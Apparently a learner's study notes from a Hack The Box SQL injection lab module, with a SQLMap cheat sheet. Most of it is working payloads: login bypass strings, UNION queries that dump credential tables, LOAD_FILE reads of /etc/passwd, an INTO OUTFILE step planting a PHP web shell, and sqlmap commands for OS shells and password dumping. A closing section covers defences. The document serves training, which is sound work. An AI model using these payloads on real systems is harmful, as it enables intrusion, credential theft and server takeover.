	> The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evalutated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access.
Note: The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads in PayloadAllTheThings(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass), each of which works on a certain type of SQL queries.

* Auth Bypass with OR operator
	> Let us try this as the username and see the response. inject_success
	> We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.
	> The login failed because notAdmin does not exist in the table and resulted in a false query overall.

[+] Using Comments
	> This section will learn how to use comments to subvert the logic of more advanced SQL queries and end up with a working SQL query to bypass the login authentication process.

* Comments
	> Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL -- and #, in addition to an in-line comment /**/ (though this is not usually used in SQL injections). The -- can be used as follows:
		mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
	> Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.
	> The # symbol can be used as well.
		mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
	> Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
	> The server will ignore the part of the query with AND password = 'something' during evaluation.

* Auth Bypass with comments
	> Let us go back to our previous example and inject admin'-- as our username. The final query will be:
		SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
	> As we can see from the syntax highlighting, the username is now admin, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.
	> Let us try using these on the login page, and log in with the username admin'-- and anything as the password:
	> As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.

* Another Example
	> SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first. Let us look at a scenario like this: => (https://academy.hackthebox.com/storage/modules/33/paranthesis_fail.png)
	> The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.
	> Let us try logging in with valid credentials admin / p@ssw0rd to see the response. => (https://academy.hackthebox.com/storage/modules/33/paranthesis_valid_fail.png)
	> As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. So let us try logging in with the credentials of another user, such as tom. => (https://academy.hackthebox.com/storage/modules/33/tom_login.png)
	> Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using admin'-- as the username. => (https://academy.hackthebox.com/storage/modules/33/paranthesis_error.png)
	> The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username admin')-- to close and comment out the rest. => (https://academy.hackthebox.com/storage/modules/33/paranthesis_success.png)
	> The query was successful, and we logged in as admin. The final query as a result of our input is:
		SELECT * FROM logins where (username='admin')
	> The query above is like the one from the previous example and returns the row containing admin.

[+] Union Clause
	> So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the OR operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL Union clause to do SQL Union Injection.

* Union
	> Before we start learning about Union Injection, we should first learn more about the SQL Union clause. The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases. Let us try using the UNION operator in a sample database. First, let us see the content of the ports table:
		mysql> SELECT * FROM ports;
	> Next, let us see the output of the ships tables:
		mysql> SELECT * FROM ships;
	> Now, let us try to use UNION to combine both results:
		mysql> SELECT * FROM ports UNION SELECT * FROM ships;
	> As we can see, UNION combined the output of both SELECT statements into one, so entries from the ports table and the ships table were combined into a single output with four rows. As we can see, some of the rows belong to the ports table while others belong to the ships table.
	> Note: The data types of the selected columns on all positions should be the same.

* Even Columns
	> A UNION statement can only operate on SELECT statements with an equal number of columns. For example, if we attempt to UNION two queries that have results with a different number of columns, we get the following error:
		mysql> SELECT city FROM ports UNION SELECT * FROM ships;
	> The above query results in an error, as the first SELECT returns one column and the second SELECT returns two. Once we have two queries that return the same number of columns, we can use the UNION operator to extract data from other tables and databases.
	> For example, if the query is:
		SELECT * FROM products WHERE product_id = 'user_input'
	> We can inject a UNION query into the input, such that rows from another table are returned:
		SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
	> The above query would return username and password entries from the passwords table, assuming the products table has two columns.

* Un-even Columns
	> We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.
	> For example, we can use any string as our junk data, and the query will return the string as its output for that column. If we UNION with the string "junk", the SELECT query would be SELECT "junk" from passwords, which will always return junk. We can also use numbers. For example, the query SELECT 1 from passwords will always return 1 as the output.
	> Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
	> Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
	> The products table has two columns in the above example, so we have to UNION with two columns. If we only wanted to get one column 'e.g. username', we have to do username, 2, such that we have the same number of columns:
		SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
	> If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used SELECT on a table with four columns, our UNION injection would be:
		UNION SELECT username, 2, 3, 4 from passwords-- '
	> This query would return:
		mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
			+-----------+-----------+-----------+-----------+
			| product_1 | product_2 | product_3 | product_4 |
			+-----------+-----------+-----------+-----------+
			|   admin   |    2      |    3      |    4      |
			+-----------+-----------+-----------+-----------+
	> As we can see, our wanted output of the 'UNION SELECT username from passwords' query is found at the first column of the second row, while the numbers filled the remaining columns.

[+] Union Injection
	> Now that we know how the Union clause works and how to use it let us learn how to utilize it in our SQL injections. Let us take the following example:
	> We see a potential SQL injection in the search parameters. We apply the SQLi Discovery steps by injecting a single quote ('), and we do get an error:
	> Since we caused an error, this may mean that the page is vulnerable to SQL injection. This scenario is ideal for exploitation through Union-based injection, as we can see our queries' results.
* Detect number of columns
	> Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:
    		- Using ORDER BY
    		- Using UNION
	> Using ORDER BY
		- The first way of detecting the number of columns is through the ORDER BY function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
		- For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.
		- If we failed at order by 4, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:
			' order by 1-- -
		- Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).
		- As we see, we get a normal result:
		- Next, let us try to sort by the second column, with the following payload:
			' order by 2-- -
		- We still get the results. We notice that they are sorted differently, as expected:
		- We do the same for column 3 and 4 and get the results back. However, when we try to ORDER BY column 5, we get the following error:
		- This means that this table has exactly 4 columns .
	> Using UNION
		- The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column UNION query:
			cn' UNION select 1,2,3-- -
		- We get an error saying that the number of columns don’t match:
		- So, let’s try four columns and see the response:
			cn' UNION select 1,2,3,4-- -
		- This time we successfully get the results, meaning once again that the table has 4 columns. We can use either method to determine the number of columns. Once we know the number of columns, we know how to form our payload, and we can proceed to the next step.

* Location of Injection
	> While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:
	> It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. We cannot place our injection at the beginning, or its output will not be printed.
	> This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the @@version SQL query as a test and place it in the second column instead of the number 2:
		cn' UNION select 1,@@version,3,4-- -
	> As we can see, we can get the database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page. In the next section, we will discuss how to enumerate the database and get data from other tables and databases.

[+] Database Enumeration
	> In the previous sections, we learned about different SQL queries in MySQL and SQL injections and how to use them. This section will put all of that to use and gather data from the database using SQL queries within SQL injections.

* MySQL Fingerprinting
	> Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.
	> As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL. The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL. However, this is a far-fetched guess, as many other databases can be used on either operating system or web server. So, there are different queries we can test to fingerprint the type of database we are dealing with.
	> As we cover MySQL in this module, let us fingerprint MySQL databases. The following queries and their output will tell us that we are dealing with MySQL:
		Payload 		When to Use 				Expected Output 					Wrong Output
		SELECT @@version 	When we have full query output 		MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' 		In MSSQL it returns MSSQL version. Error with other DBMS.
		SELECT POW(1,1) 	When we only have numeric output 	1 							Error with other DBMS
		SELECT SLEEP(5) 	Blind/No Output 			Delays page response for 5 seconds and returns 0. 	Will not delay response with other DBMS
	> As we saw in the example from the previous section, when we tried @@version, it gave us: The output 10.3.22-MariaDB-1ubuntu1 means that we are dealing with a MariaDB DBMS similar to MySQL. Since we have direct query output, we will not have to test the other payloads. Instead, we can test them and see what we get.

* INFORMATION_SCHEMA Database
	> To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
    		- List of databases
    		- List of tables within each database
    		- List of columns within each table
	> With the above information, we can form our SELECT statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the INFORMATION_SCHEMA Database.
	> The INFORMATION_SCHEMA database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.
	> So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
		SELECT * FROM my_database.users;
	> Similarly, we can look at tables present in the INFORMATION_SCHEMA Database.

* SCHEMATA
	> To start our enumeration, we should find what databases are available on the DBMS. The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.
	> Let us first test this on a local database to see how the query is used:
		mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
	> We see the ilfreight and dev databases.
	> Note: The first three databases are default(mysql, information_schema, performance_schema) MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.
	> Now, let's do the same using a UNION SQL injection, with the following payload:
		cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
	> Once again, we see two databases, ilfreight and dev, apart from the default ones. Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the SELECT database() query. We can do this similarly to how we found the DBMS version in the previous section:
		cn' UNION select 1,database(),2,3-- -
	> We see that the database name is ilfreight. However, the other database (dev) looks interesting. So, let us try to retrieve the tables from it.

* TABLES
	> Before we dump data from the dev database, we need to get a list of the tables to query them with a SELECT statement. To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.
	> The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the dev database:
		cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
	> Note how we replaced the numbers '2' and '3' with 'TABLE_NAME' and 'TABLE_SCHEMA', to get the output of both columns in the same query.
	> Note: we added a (where table_schema='dev') condition to only return tables from the 'dev' database, otherwise we would get all tables in all databases, which can be many.
	> We see four tables in the dev database, namely credentials, framework, pages, and posts. For example, the credentials table could contain sensitive information to look into it.

* COLUMNS
	> To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this. As we did before, let us try this payload to find the column names in the credentials table:
		cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
	> The table has two columns named username and password. We can use this information and dump data from the table.

* Data
	> Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:
		cn' UNION select 1, username, password, 4 from dev.credentials-- -
	> Remember: don't forget to use the dot operator to refer to the 'credentials' in the 'dev' database, as we are running in the 'ilfreight' database, as previously discussed.


[+] Reading Files
	> In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.

* Privileges
	> Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

* DB User
	> First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
		- SELECT USER()
		- SELECT CURRENT_USER()
		- SELECT user from mysql.user

	> Our UNION injection payload will be as follows:
		cn' UNION SELECT 1, user(), 3, 4-- -
	> or:
		cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
	> Which tells us our current user, which in this case is root:
	> This is very promising, as a root user is likely to be a DBA, which gives us many privileges.

* User Privileges
	> Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:
		SELECT super_priv FROM mysql.user
	> Once again, we can use the following payload with the above query:
		cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
	> If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
		cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
	> The query returns Y, which means YES, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
		cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
	> Once again, we can add WHERE user="root" to only show our current user root privileges. Our payload would be:
		cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user="root"-- -
	> And we see all of the possible privileges given to our current user:
	> We see that the FILE privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.

* LOAD_FILE
	> Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
		SELECT LOAD_FILE('/etc/passwd');
	> Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
	> Similar to how we have been using a UNION injection, we can use the above query:
		cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
	> We were able to successfully read the contents of the passwd file through the SQL injection. Unfortunately, this can be potentially used to leak the application source code as well.

* Another Example
	> We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
		cn' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4-- -
	> However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting [Ctrl + U]. => (https://academy.hackthebox.com/storage/modules/33/load_file_source.png)
	> The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

[+] Writing Files
	> When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server. This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.

* Write File Privileges
	> To be able to write files to the back-end server using a MySQL database, we require three things:
    		- User with FILE privilege enabled
    		- MySQL global secure_file_priv variable not enabled
    		- Write access to the location we want to write to on the back-end server
	> We have already found that our current user has the FILE privilege necessary to write files. We must now check if the MySQL database has that privilege. This can be done by checking the secure_file_priv global variable.

* secure_file_priv
	> The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder. This means that reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to NULL, meaning that we cannot read/write files anywhere within the system.
	> So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:
		SHOW VARIABLES LIKE 'secure_file_priv';
	> However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables(https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html) are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
	> We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.
	> The final SQL query is the following:
		SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
	> So, similar to other UNION injection queries, we can get the above query result with the following payload. Remember to add two more columns 1 & 4 as junk data to have a total of 4 columns':
		cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
	> And the result shows that the secure_file_priv value is empty, meaning that we can read/write files to any location.

* SELECT INTO OUTFILE
	> Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the SELECT .. INTO OUTFILE statement. The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.
	> To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
secure_file_priv
		SELECT * from users INTO OUTFILE '/tmp/credentials';
	> If we go to the back-end server and cat the file, we see that table's content:
		m1l0js@htb[/htb]$ cat /tmp/credentials 
		1       admin   392037dbba51f692776d6cefb6dd546d
		2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
	> It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
		SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
	> When we cat the file, we see that text:
		m1l0js@htb[/htb]$ cat /tmp/test.txt 
		this is a test
		m1l0js@htb[/htb]$ ls -la /tmp/test.txt 
		-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
	> As we can see above, the test.txt file was created successfully and is owned by the mysql user.
	> Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

* Writing Files through SQL Injection
	> Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully! to the /var/www/html/proof.txt file, which we can then access on the web application:
		select 'file written successfully!' into outfile '/var/www/html/proof.txt'
	> Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this wordlist for Windows(https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
	> The UNION injection payload would be as follows:
		cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
	> We don’t see any errors on the page, which indicates that the query succeeded. Checking for the file proof.txt in the webroot, we see that it indeed exists:
	> Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

* Writing a Web Shell
	> Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:
		<?php system($_REQUEST[0]); ?>
	> We can reuse our previous UNION injection payload, and change the string to the above, and the file name to shell.php:
		cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
	> Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL:
	> The output of the id command confirms that we have code execution and are running as the www-data user.


[+] Mitigating SQL Injection
	> We have learned about SQL injections, why they occur, and how we can exploit them. We should also learn how to avoid these types of vulnerabilities in our code and patch them when found. Let's look at some examples of how SQL Injection can be mitigated.

* Input Sanitization
	> Here's the snippet of the code from the authentication bypass section we discussed earlier:
		<SNIP>
		  $username = $_POST['username'];
		  $password = $_POST['password'];
		
		  $query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
		  echo "Executing query: " . $query . "<br /><br />";
		
		  if (!mysqli_query($conn ,$query))
		  {
		          die('Error: ' . mysqli_error($conn));
		  }
		
		  $result = mysqli_query($conn, $query);
		  $row = mysqli_fetch_array($result);
		<SNIP>
	> As we can see, the script takes in the username and password from the POST request and passes it to the query directly. This will let an attacker inject anything they wish and exploit the application. Injection can be avoided by sanitizing any user input, rendering injected queries useless. Libraries provide multiple functions to achieve this, one such example is the mysqli_real_escape_string() function. This function escapes characters such as ' and ", so they don't hold any special meaning.

		<SNIP>
		$username = mysqli_real_escape_string($conn, $_POST['username']);
		$password = mysqli_real_escape_string($conn, $_POST['password']);
		
		$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
		echo "Executing query: " . $query . "<br /><br />";
		<SNIP>

	> As expected, the injection no longer works due to escaping the single quotes. A similar example is the pg_escape_string() which used to escape PostgreSQL queries.

* Input Validation
	> User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of ...@email.com, and so on.
	> Consider the following code snippet from the ports page, which we used UNION injections on:
		<?php
		if (isset($_GET["port_code"])) {
			$q = "Select * from ports where port_code ilike '%" . $_GET["port_code"] . "%'";
			$result = pg_query($conn,$q);
		    
			if (!$result)
			{
		   		die("</table></div><p style='font-size: 15px;'>" . pg_last_error($conn). "</p>");
			}
		<SNIP>
		?>
	> We see the GET parameter port_code being used in the query directly. It's already known that a port code consists only of letters or spaces. We can restrict the user input to only these characters, which will prevent the injection of queries. A regular expression can be used for validating the input:

		<SNIP>
		$pattern = "/^[A-Za-z\s]+$/";
		$code = $_GET["port_code"];
		
		if(!preg_match($pattern, $code)) {
		  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
		}
		
		$q = "Select * from ports where port_code ilike '%" . $code . "%'";
		<SNIP>

	> The code is modified to use the preg_match() function, which checks if the input matches the given pattern or not. The pattern used is [A-Za-z\s]+, which will only match strings containing letters and spaces. Any other character will result in the termination of the script.
	> We can test the following injection:
		'; SELECT 1,2,3,4-- -
	> As seen in the image above, input with injected queries was rejected by the server.

* User Privileges
	> As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.
	> Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.
		MariaDB [(none)]> CREATE USER 'reader'@'localhost';
		MariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
	> The commands above add a new MariaDB user named reader who is granted only SELECT privileges on the ports table. We can verify the permissions for this user by logging in:
		m1l0js@htb[/htb]$ mysql -u reader -p
		MariaDB [(none)]> use ilfreight;
		MariaDB [ilfreight]> SHOW TABLES;
		MariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
		MariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;
			ERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'
	> The snippet above confirms that the reader user cannot query other tables in the ilfreight database. The user only has access to the ports table that is needed by the application.

* Web Application Firewall
	> Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string INFORMATION_SCHEMA would be rejected, as it's commonly used while exploiting SQL injection.

* Parameterized Queries
	> Another way to ensure that the input is safely sanitized is by using parameterized queries. Parameterized queries contain placeholders for the input data, which is then escaped and passed on by the drivers. Instead of directly passing the data into the SQL query, we use placeholders and then fill them with PHP functions.
	> Consider the following modified code:
		<SNIP>
		  $username = $_POST['username'];
		  $password = $_POST['password'];
		
		  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
		  $stmt = mysqli_prepare($conn, $query);
		  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
		  mysqli_stmt_execute($stmt);
		  $result = mysqli_stmt_get_result($stmt);
		
		  $row = mysqli_fetch_array($result);
		  mysqli_stmt_close($stmt);
		<SNIP>
	> The query is modified to contain two placeholders, marked with ? where the username and password will be placed. We then bind the username and password to the query using the mysqli_stmt_bind_param() function. This will safely escape any quotes and place the values in the query.

* Conclusion
	> The list above is not exhaustive, and it could still be possible to exploit SQL injection based on the application logic. The code examples shown are based on PHP, but the logic applies across all common languages and libraries.

-=-=-=-=-=
##SQLMAP ESSENTIALS

| **Command**                                                  | **Description**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | View the basic help menu                                    |
| `sqlmap -hh`                                                 | View the advanced help menu                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | Run `SQLMap` without asking for user input                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | `SQLMap` with POST request                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                          | Passing an HTTP request file to `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | Specifying a cookie header                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | Specifying a PUT request                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | Specify verbosity level                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | Specifying a prefix or suffix                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | Specifying the level and risk                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | Table enumeration                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | Database schema enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | Searching for data                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | Password enumeration and cracking                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
| `sqlmap --list-tampers`                                      | List all tamper scripts                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | Check for DBA privileges                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | Reading a local file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | Spawning an OS shell                                        |



* SQLMap Overview
	> SQLMap(https://github.com/sqlmapproject/sqlmap) is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.
